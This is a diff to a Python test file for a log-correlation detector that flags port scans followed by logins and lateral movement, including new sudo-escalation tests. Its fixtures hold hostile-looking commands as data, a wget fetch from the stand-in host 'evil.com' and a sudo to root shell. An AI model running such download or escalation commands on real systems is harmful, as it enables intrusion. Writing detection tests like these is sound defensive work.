@@ -21,13 +21,18 @@ def ok(ip, user, s):
 
 
 def block(ip, port, s):
-    return {"event_type": "ufw_block", "src_ip": ip, "dst_port": port,
+    return {"event_type": "fw_block", "src_ip": ip, "dst_port": port,
             "protocol": "TCP", "firewall": "ufw", "timestamp": ts(s)}
 
 
 def exe(user, cmd, s):
     return {"event_type": "execve", "user": user, "command": cmd,
             "result": "success", "pid": "1", "timestamp": ts(s)}
+
+
+def sudo(user, target, cmd, s):
+    return {"event_type": "sudo_usage", "user": user, "target_user": target,
+            "command": cmd, "timestamp": ts(s)}
 
 
 # ── brute_force ───────────────────────────────────────────────────────────────
@@ -129,6 +134,22 @@ def test_scan_auth_outside_window_no_incident():
     assert incidents == []
 
 
+def test_single_port_block_not_flagged_as_scan():
+    # One blocked port before a login attempt is noise, not a port scan
+    ufw = [block("1.2.3.4", 22, 0)]
+    auth = [fail("1.2.3.4", 300)]
+    incidents = correlate_events(auth, ufw, [], window_seconds=600)
+    assert incidents == []
+
+
+def test_two_distinct_ports_triggers_scan():
+    ufw = [block("1.2.3.4", 22, 0), block("1.2.3.4", 80, 30)]
+    auth = [fail("1.2.3.4", 300)]
+    incidents = correlate_events(auth, ufw, [], window_seconds=600)
+    assert len(incidents) == 1
+    assert incidents[0]["chain_type"] == "portscan_then_login"
+
+
 def test_portscan_then_login_only_blocks_within_window_included():
     ufw = [
         block("1.2.3.4", 22, 0),
@@ -139,7 +160,7 @@ def test_portscan_then_login_only_blocks_within_window_included():
     incidents = correlate_events(auth, ufw, [], window_seconds=600)
     assert len(incidents) == 1
     # Only the 2 blocks within 600s of the auth attempt should be included
-    block_events = [e for e in incidents[0]["events"] if e["event_type"] == "ufw_block"]
+    block_events = [e for e in incidents[0]["events"] if e["event_type"] == "fw_block"]
     assert len(block_events) == 2
 
 
@@ -189,6 +210,42 @@ def test_lateral_movement_different_user_not_linked():
     aud = [exe("bob", "/usr/bin/wget http://evil.com/x", 60)]  # different user
     incidents = correlate_events(auth, [], aud, window_seconds=600)
     assert incidents == []
+
+
+def test_lateral_movement_sudo_to_root_critical():
+    auth = [ok("10.0.0.1", "alice", 0), sudo("alice", "root", "/bin/bash", 30)]
+    incidents = correlate_events(auth, [], [], window_seconds=600)
+    assert len(incidents) == 1
+    assert incidents[0]["chain_type"] == "lateral_movement"
+    assert incidents[0]["severity"] == "critical"
+
+
+def test_lateral_movement_sudo_to_non_root_high():
+    auth = [ok("10.0.0.1", "alice", 0), sudo("alice", "deploy", "/usr/bin/id", 30)]
+    incidents = correlate_events(auth, [], [], window_seconds=600)
+    assert len(incidents) == 1
+    assert incidents[0]["severity"] == "high"
+
+
+def test_lateral_movement_sudo_after_window_not_linked():
+    auth = [ok("10.0.0.1", "alice", 0), sudo("alice", "root", "/bin/bash", 601)]
+    incidents = correlate_events(auth, [], [], window_seconds=600)
+    assert incidents == []
+
+
+def test_lateral_movement_sudo_different_user_not_linked():
+    auth = [ok("10.0.0.1", "alice", 0), sudo("bob", "root", "/bin/bash", 30)]
+    incidents = correlate_events(auth, [], [], window_seconds=600)
+    assert incidents == []
+
+
+def test_lateral_movement_sudo_and_execve_combined():
+    auth = [ok("10.0.0.1", "alice", 0), sudo("alice", "root", "/bin/bash", 30)]
+    aud = [exe("alice", "/usr/bin/wget http://evil.com/x", 60)]
+    incidents = correlate_events(auth, [], aud, window_seconds=600)
+    assert len(incidents) == 1
+    assert incidents[0]["severity"] == "critical"
+    assert len(incidents[0]["events"]) == 3  # login + sudo + execve
 
 
 # ── custom window ─────────────────────────────────────────────────────────────
